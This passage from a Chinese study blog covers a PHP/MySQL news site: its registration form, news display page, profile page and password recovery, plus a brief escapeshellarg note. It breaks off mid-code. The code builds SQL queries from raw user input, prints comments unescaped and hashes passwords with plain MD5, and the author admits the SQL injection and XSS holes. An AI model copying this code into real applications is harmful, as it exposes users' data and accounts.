class="line"></span><br><span class="line">$id=$_GET[<span class="string">"id"</span>];</span><br><span class="line">$str = escapeshellarg($id);</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/24escapeshellarg.png" alt></p><blockquote><p><a href="https://uknowsec.cn/posts/notes/php内置过滤函数总结.html" target="_blank" rel="noopener">参考博文</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> summary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note25</title>
      <link href="/2019/08/17/note25/"/>
      <url>/2019/08/17/note25/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 修改新闻管理系统注册用户功能，添加没有勾选<code>免责协议</code>时要提示，必须勾选后才能注册成功，点击<code>免责协议</code>可以展示协议内容，继续修改点赞功能，展示新闻管理系统，介绍思路。</p><a id="more"></a><!--export--><h3 id="一、注册功能"><a href="#一、注册功能" class="headerlink" title="一、注册功能"></a>一、注册功能</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Require_once &apos;../basedir/header.php&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head &gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;hr&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;div style=&quot;width:100%;text-align:center&quot;&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;h1&gt;注册&lt;/h1&gt;</span><br><span class="line">        &lt;form action=&quot;logup.php&quot; method=&quot;post&quot; onsubmit=&quot;checkEmpty()&quot; onchange=&quot;checkSelect()&quot;&gt;</span><br><span class="line">            &lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;name&quot; id=&quot;idName&quot; placeholder=&quot;用户名&quot;&gt;&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;passwd&quot; id=&quot;idPwd&quot; placeholder=&quot;密码&quot;&gt;&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;passwdagain&quot; id=&quot;idPwdAg&quot; placeholder=&quot;再次输入密码&quot;&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">            &lt;p&gt;&lt;a href=&quot;./agree.php&quot; target=&quot;_blank&quot;&gt;&lt;input type=&quot;checkbox&quot; name=&quot;agree&quot; id=&quot;idAgree&quot;&gt;已阅读并同意《免责声明》&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;提交&quot;&gt;&lt;/p&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td align=&quot;right&quot;&gt;</span><br><span class="line">            &lt;a href=&quot;/login.php&quot;&gt;&lt;button  align=&quot;right&quot;&gt;用户登录&lt;/button&gt;&lt;/a&gt;</span><br><span class="line">        &lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function checkEmpty()&#123;</span><br><span class="line">        var name = document.getElementById(&apos;idName&apos;).value;</span><br><span class="line">        var pwd = document.getElementById(&apos;idPwd&apos;).value;</span><br><span class="line">        var pwdAg = document.getElementById(&apos;idPwdAg&apos;).value;</span><br><span class="line">        var agree = document.getElementById(&apos;idAgree&apos;).checked;</span><br><span class="line">        if(!(name &amp;&amp; pwd &amp;&amp; pwdAg))&#123;</span><br><span class="line">            alert(&apos;所有输入框内容不能为空！&apos;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            if (pwd != pwdAg) &#123;</span><br><span class="line">                alert(&apos;两次输入密码不一致！请重新输入密码！&apos;);</span><br><span class="line">                return;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                if(!agree)&#123;</span><br><span class="line">                    alert(&quot;请阅读完免责协议并勾选同意！&quot;);</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return agree;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">Require_once &apos;../basedir/footer.php&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL^E_NOTICE);</span><br><span class="line">Require_once &quot;sql.php&quot;;</span><br><span class="line"></span><br><span class="line">$agree = $_POST[&apos;agree&apos;];</span><br><span class="line"></span><br><span class="line">$uname = base64_encode($_POST[&apos;name&apos;]);</span><br><span class="line"></span><br><span class="line">$upass = md5($_POST[&apos;passwd&apos;]);</span><br><span class="line"></span><br><span class="line">$passAgain = md5($_POST[&apos;passwdagain&apos;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if ($uname &amp;&amp; $upass &amp;&amp; $passAgain) &#123;</span><br><span class="line">    $checkName = mysql_query(&quot;SELECT * FROM `tb_users` where `username` = &apos;$uname&apos;;&quot;);</span><br><span class="line"></span><br><span class="line">    while (@$row = mysql_fetch_array($checkName))//转成数组，且返回第一条数据,当不是一个对象时候退出</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        if ($uname == $row[&apos;username&apos;]) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;用户名已存在，请重新输入！&apos;);&lt;/script&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($upass==$passAgain &amp;&amp; $agree==&apos;on&apos;) &#123;</span><br><span class="line">        echo</span><br><span class="line">        $result = mysql_query(&quot;INSERT INTO `tb_users` (`username`, `password`) VALUES(&apos;$uname&apos;, &apos;$upass&apos;);&quot;);</span><br><span class="line">        if (mysql_affected_rows()) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;恭喜你注册成功！即将跳转到登录页面！&apos;); location.href=&apos;login.php&apos;&lt;/script&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="二、问题与总结"><a href="#二、问题与总结" class="headerlink" title="二、问题与总结"></a>二、问题与总结</h3><p><strong>程序设计问题</strong>：点赞功能实现思路：点击按钮触发事件，进入后台处理页面，对数据库里面的<code>type</code>进行修改，统计出<code>type</code>的总和即热度；访问量的统计，每次从数据库读信息把view加1然后保存到数据库里面。</p><p><strong>程序架构问题</strong>：层次不清，目录比较混乱。</p><p><strong>团队合作问题</strong>：合作之前关于变量取名，程序处理结构均未沟通好，导致一些程序写好后合并程序时还要做修改。</p><p><strong>漏洞问题</strong>：未对用户输入做相应的处理，存在<code>SQL</code>注入、<code>XSS</code>等漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> MySQL </tag>
            
            <tag> 新闻管理系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note24</title>
      <link href="/2019/08/17/note24/"/>
      <url>/2019/08/17/note24/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 新闻管理系统新闻展示页面、个人信息、找回密码以及点赞功能编写。</p><a id="more"></a><!--export--><h3 id="一、新闻展示页面-show-news-php"><a href="#一、新闻展示页面-show-news-php" class="headerlink" title="一、新闻展示页面 show_news.php"></a>一、新闻展示页面 show_news.php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;</span><br><span class="line">        新闻展示界面</span><br><span class="line">    &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        $hot = 0;</span><br><span class="line">        $title = 0;</span><br><span class="line">        $author = 0;</span><br><span class="line">        $view = 0;</span><br><span class="line">        $time = 0;</span><br><span class="line">        $content = 0;</span><br><span class="line">        @$id= $_GET[&apos;id&apos;];</span><br><span class="line">        $hostname = &apos;127.0.0.1&apos;;</span><br><span class="line">        $username = &apos;root&apos;;</span><br><span class="line">        $passwd = &apos;root&apos;;</span><br><span class="line">        if($id)&#123;</span><br><span class="line">            @$con = mysql_connect(&apos;127.0.0.1&apos;, &apos;root&apos;,&apos;root&apos;) or die(mysql_error());</span><br><span class="line">            @mysql_select_db(&quot;lianxi&quot;) or die(mysql_error());</span><br><span class="line">            mysql_query(&quot;set names &apos;utf8&apos;&quot;) or die(mysql_error());</span><br><span class="line">            $sql = &quot;SELECT * FROM `tb_news` WHERE `id`=&apos;$id&apos;&quot;;</span><br><span class="line">            $result = mysql_query($sql) or die(mysql_error());</span><br><span class="line">            for($i=0; $i&lt;mysql_affected_rows(); $i++)&#123;</span><br><span class="line">                $arr = mysql_fetch_assoc($result);</span><br><span class="line">                if($arr[&apos;id&apos;] == $id)&#123;</span><br><span class="line">                    $hot=$arr[&apos;hot&apos;];</span><br><span class="line">                    $title = base64_decode($arr[&apos;title&apos;]);</span><br><span class="line">                    $author = base64_decode($arr[&apos;author&apos;]);</span><br><span class="line">                    $view = $arr[&apos;view&apos;];</span><br><span class="line">                    $time = $arr[&apos;add_time&apos;];</span><br><span class="line">                    $content = base64_decode($arr[&apos;contents&apos;]);</span><br><span class="line">                        break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;&lt;h1 align=&apos;center&apos;&gt;$title&lt;/h1&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;div style=&apos;float: left&apos;&gt;&lt;label&gt;作者： $author&lt;/label&gt;&lt;label&gt; &amp;nbsp  时间：$time&lt;/label&gt;&lt;/div&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;div style=&apos;float: right&apos;&gt;&lt;label&gt;热度： $hot&lt;/label&gt;   &lt;label&gt; / 浏览量：$view&lt;/label&gt;&lt;/div&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;p align=&apos;center&apos;&gt;$content&lt;/p&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &lt;&lt;&lt;EOF</span><br><span class="line">            &lt;div align=&quot;center&quot;&gt;</span><br><span class="line">                &lt;form action=&quot;newAddnews.php&quot;, mathod=&quot;post&quot;&gt;</span><br><span class="line">                    &lt;textarea rows=&apos;10&apos; cols=&apos;100&apos; style=&quot;resize: none&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">                    &lt;br&gt;</span><br><span class="line">                    &lt;input type=&quot;submit&quot; name=&quot;suubmit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">EOF;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;h4 align=&apos;center&apos;&gt;评论&lt;/h4&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        if($id) &#123;</span><br><span class="line">            @$con = mysql_connect(&apos;127.0.0.1&apos;, &apos;root&apos;, &apos;root&apos;) or die(mysql_error());</span><br><span class="line">            @mysql_select_db(&quot;lianxi&quot;) or die(mysql_error());</span><br><span class="line">            mysql_query(&quot;set names &apos;utf8&apos;&quot;) or die(mysql_error());</span><br><span class="line">            $sql = &quot;SELECT * FROM `tb_discuss` WHERE `new_id`=&apos;$id&apos;&quot;;</span><br><span class="line">            $result = mysql_query($sql) or die(mysql_error());</span><br><span class="line">            for ($i = 0; $i &lt; mysql_affected_rows(); $i++) &#123;</span><br><span class="line">                $arr1 = mysql_fetch_assoc($result);</span><br><span class="line">                $discussUser = base64_decode($arr1[&apos;discuss_user&apos;]);</span><br><span class="line">                $time = $arr1[&apos;discuss_time&apos;];</span><br><span class="line">                $discussContent = $arr1[&quot;discuss_content&quot;];</span><br><span class="line">                echo &quot;&lt;hr style=\&quot;border:1px dashed #000; height:1px\&quot;&gt;&quot;;</span><br><span class="line">                echo &quot;&lt;p align=&apos;center&apos;&gt;用户：$discussUser&quot; .     &quot;     时间：$time&lt;/p&gt;&quot;;</span><br><span class="line">                echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">                echo &quot;&lt;p align=&apos;center&apos;&gt;$discussContent&lt;/p&gt;&quot;;</span><br><span class="line">                echo &quot;&lt;hr style=\&quot;border:1px dashed #000; height:1px\&quot;&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            mysql_close($con);</span><br><span class="line">        &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="二、个人信息"><a href="#二、个人信息" class="headerlink" title="二、个人信息"></a>二、个人信息</h3><h4 id="1-personal-information-php"><a href="#1-personal-information-php" class="headerlink" title="1. personal_information.php"></a>1. personal_information.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php Require_once &apos;../basedir/header.php&apos;; ?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">error_reporting(E_ALL^E_NOTICE);</span><br><span class="line">if(!isset($_SESSION[&apos;username&apos;]))&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&apos;请登录后查看！&apos;);location.href=&apos;login.php&apos;;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;</span><br><span class="line">        个人资料</span><br><span class="line">    &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;div style=&quot;margin: 0px 600px 0px 600px&quot;&gt;</span><br><span class="line">           &lt;form action=&quot;personal_informationhoutai.php&quot; method=&quot;post&quot; enctype= &quot;multipart/form-data&quot;&gt;</span><br><span class="line"></span><br><span class="line">                    头像：&lt;input type=&quot;file&quot; name=&quot;addr&quot;/&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">                    邮箱：&lt;input type=&quot;email&quot; name=&quot;email&quot;/&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">                    性别：&lt;input type=&quot;radio&quot; name=&quot;sexnan&quot;/&gt;男</span><br><span class="line">                          &lt;input type=&quot;radio&quot; name=&quot;sexnv&quot;/&gt;女&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">                &lt;input type=&quot;submit&quot; value=&quot;提交&quot;/&gt;</span><br><span class="line">               &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">Require_once &apos;../basedir/footer.php&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="2-personal-information-backstage-php"><a href="#2-personal-information-backstage-php" class="headerlink" title="2. personal_information_backstage.php"></a>2. personal_information_backstage.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Require_once &quot;sql.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">error_reporting(E_ALL^E_NOTICE);</span><br><span class="line"></span><br><span class="line">$username = $_SESSION[&apos;username&apos;];</span><br><span class="line">$sql = &quot;SELECT * FROM `tb_users` WHERE `username`=&apos;$username&apos;;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$row = mysql_query($sql);</span><br><span class="line"></span><br><span class="line">$row = mysql_fetch_assoc($row);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$path = $row[&apos;addr&apos;];</span><br><span class="line">//var_dump($path);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">//将文件从临时文件中转移到文件保存路径</span><br><span class="line">var_dump(move_uploaded_file($_FILES[&apos;addr&apos;][&apos;tmp_name&apos;], $path));</span><br><span class="line"></span><br><span class="line">$email=  $_POST[&apos;email&apos;];</span><br><span class="line"></span><br><span class="line">    if($_POST[&apos;sexmale&apos;])&#123;</span><br><span class="line">        $sex = 1;</span><br><span class="line">    &#125;</span><br><span class="line">    if($_POST[&apos;sexfemale&apos;])&#123;</span><br><span class="line">        $sex = -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">var_dump($_SESSION[&apos;username&apos;]);</span><br><span class="line">//var_dump($sex);</span><br><span class="line">$yuju = &quot;UPDATE `tb_users` SET email=&apos;&#123;$email&#125;&apos;,sex=&apos;$sex&apos; WHERE `username` = &apos;$_SESSION[&apos;username&apos;]&apos;;&quot;;</span><br><span class="line">//echo $path;</span><br><span class="line">$row=  mysql_query(&quot;&#123;$path&#125;&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="三、找回密码"><a href="#三、找回密码" class="headerlink" title="三、找回密码"></a>三、找回密码</h3><h4 id="1-find-passwd-php"><a href="#1-find-passwd-php" class="headerlink" title="1.find_passwd.php"></a>1.find_passwd.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Require_once &apos;../basedir/header.php&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head &gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2 align=&quot;center&quot;&gt;找回密码&lt;/h2&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;!--text-align:center;--&gt;</span><br><span class="line">&lt;div style=&quot;text-align:center;&quot;&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;form action=&quot;findPasswdhoutai.php&quot; method=&quot;post&quot; onsubmit=&quot;checkpass()&quot; onchange=&quot;checkanswer()&quot;&gt;</span><br><span class="line">            &lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;name&quot; placeholder=&quot;输入要找回密码的用户名&quot; style=&quot;height: 20px;width: 200px&quot;&gt;&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;问题：你的爱好是？&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;answer&quot; id=&quot;inanswer&quot; placeholder=&quot;答案&quot; style=&quot;height: 20px;width: 200px&quot;&gt;&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;passwd&quot; id=&quot;passFirst&quot; placeholder=&quot;新密码&quot; style=&quot;height: 20px;width: 200px&quot;&gt;&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;passwdagain&quot; id=&quot;passSecond&quot; placeholder=&quot;再次输入密码&quot; style=&quot;height: 20px;width: 200px&quot;&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">            &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;提交&quot;&gt;&lt;/p&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td align=&quot;right&quot;&gt;</span><br><span class="line">        &lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">Require_once &apos;../basedir/footer.php&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="2-find-passwd-backstage-php"><a href="#2-find-passwd-backstage-php" class="headerlink" title="2.find_passwd_backstage.php"></a>2.find_passwd_backstage.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">Require_once &quot;sql.php&quot;;</span><br><span class="line">//需要修改！</span><br><span class="line">error_reporting(E_ALL^E_NOTICE);</span><br><span class="line">$username = $_POST[&apos;name&apos;];</span><br><span class="line">var_dump($username);</span><br><span class="line">//    $username = &apos;root&apos;;</span><br><span class="line">//删除用户</span><br><span class="line">$sql = &quot;SELECT * FROM `tb_anquan` WHERE `username`=&apos;$username&apos;;&quot;;</span><br><span class="line">echo $sql;</span><br><span class="line">$result = mysql_query($sql) or die(mysql_error());</span><br><span class="line"></span><br><span class="line">$arr = mysql_fetch_assoc($result);</span><br><span class="line">$answer = $arr[&apos;mima&apos;];</span><br><span class="line">//echo $answer;</span><br><span class="line">//$inAnswer = $_POST[&apos;answer&apos;];</span><br><span class="line">if($answer != $_POST[&apos;answer&apos;])&#123;</span><br><span class="line">       die(&quot;&lt;script&gt;alert(&apos;密保答案不正确！&apos;);&lt;/script&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$passFirst = $_POST[&apos;passwd&apos;];</span><br><span class="line">$passSecond = $_POST[&apos;passwdagain&apos;];</span><br><span class="line">if($passFirst==NULL &amp;&amp; $passSecond==NULL) &#123;</span><br><span class="line">    die(&quot;&lt;script&gt;alert(&apos;请输入密码！&apos;);&lt;/script&gt;&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if($passFirst != $passSecond)&#123;</span><br><span class="line">        die(&quot;&lt;script&gt;alert(&apos;输入密码不一致，请重新输入！&apos;);&lt;/script&gt;&quot;);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        $passFirst = md5($passFirst);</span><br><span class="line">        $sql = &quot;UPDATE `tb_users` SET `password`= 